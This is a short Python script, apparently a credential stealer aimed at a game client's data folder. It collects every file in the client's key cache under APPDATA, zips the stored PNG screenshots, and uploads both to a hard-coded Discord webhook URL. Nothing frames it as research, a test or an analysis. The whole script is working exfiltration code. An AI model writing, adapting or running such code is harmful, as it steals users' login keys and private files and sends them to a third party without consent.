import os
import zipfile
import requests

appdata = os.getenv("APPDATA")
keys_path = os.path.join(appdata, ".kfaction", "cache", "keys")
screenshots_path = os.path.join(appdata, ".kfaction", "screenshots")
webhook_url = "https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1"

def send_webhook(file_path, webhook_url):
    with open(file_path, "rb") as f:
        files = {"file": (file_path, f)}
        requests.post(webhook_url, files=files)

def zip_and_send_screenshots(screenshots_path, webhook_url):
    if os.path.exists(screenshots_path):
        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:
            for filename in os.listdir(screenshots_path):
                file_path = os.path.join(screenshots_path, filename)
                if os.path.isfile(file_path) and file_path.endswith(".png"):
                    zip_file.write(file_path)
        send_webhook('screenshots.zip', webhook_url)

if os.path.exists(keys_path):
    for filename in os.listdir(keys_path):
        file_path = os.path.join(keys_path, filename)
        if os.path.isfile(file_path):
            send_webhook(file_path, webhook_url)

zip_and_send_screenshots(screenshots_path, webhook_url)
